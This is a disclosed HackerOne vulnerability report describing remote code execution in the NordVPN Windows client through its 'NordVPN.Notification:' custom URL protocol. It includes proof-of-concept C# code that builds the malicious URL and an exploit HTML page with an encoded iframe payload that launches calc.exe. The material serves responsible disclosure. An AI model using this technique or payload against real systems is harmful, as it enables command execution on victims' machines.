# Possible RCE through Windows Custom Protocol on Windows client

## Report Details
- **Report ID**: 1001255
- **URL**: https://hackerone.com/reports/1001255
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-07T15:48:53.501Z
- **Disclosed**: 2021-01-25T12:01:22.833Z

## Reporter
- **Username**: cyku
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
## Summary:
The NordVPN windows client application registered two custom protocols **NordVPN:** and **NordVPN.Notification:** for process communication. This makes us are able to  communicate with NordVPN.exe from web browser.
After looking the executable binary, I noticed the class **NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl** eventually calls function  **Process.Start** with controllable argument, and this notification can be triggered through custom protocol **NordVPN.Notification:**. 
So it's possible to execute arbitrary system command from web browser.

## Steps To Reproduce:

  1. Create the malicious URL, the below is my script to generate the URL, it requires importing "Newtonsoft.Json.dll" and "NordVpn.Core.dll".

    ```csharp
    // Program.cs
    using System;
    using System.Collections.Generic;
    using NordVpn.Core.Tools;
    using NordVpn.Core.Models.ToastNotifications.Notifications;
    using System.Diagnostics;

    namespace ExploitApp
    {
        class Program
        {
            static void Main(string[] args)
            {
                Dictionary<string, string> arguments = new Dictionary<string, string>();
                arguments["OpenUrl"] = "calc.exe";
                NotificationActionArgs toastArgs = new NotificationActionArgs("", arguments);
                String exploit = ObjectCompressor.CompressObject(toastArgs);
                Console.Write(String.Format("NordVPN.Notification:{0}", exploit));
                Console.ReadKey();
            }
        }
    }
    ```

  2. Add the URL into a html file with iframe tag, then serves it on HTTP server.

    ```html
    <!-- exploit.html -->
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Exploit</title>
    </head>
    <body>
        <iframe src="NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA"></iframe>
    </body>
    </html>
    ```

  3. Open the html file in the browser. Modern web browser may popup a window to confirm to open NordVPN.exe, if we choose "Open NordVPN", the command will be executed and popup a calc.exe.

## Proof of Concept Gif

Tested on Windows client lastest version 6.31.5.0.

{F1024995}

## Additional Information

The below is the simple call stack to Process.Start from ListenNotificationOpenUrl.
```
NordVPN.exe/NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl.OnInteraction(NotificationActionArgs args)
    NordVpn.Application.Core.dll/NordVpn.Application.Core.ViewModels.Shell.ShellViewModel.Handle(ShowBrowserMessage message)
        NordVPN.exe/NordVpn.Views.Shell.FaultHandlingDefaultBrowser.Open(string url)
            Process.Start(string fileName);
```

## Impact

Possible to execute system command on victim's computer and take control of the computer.

## Attachments
- possible_rce_in_windows_client.gif
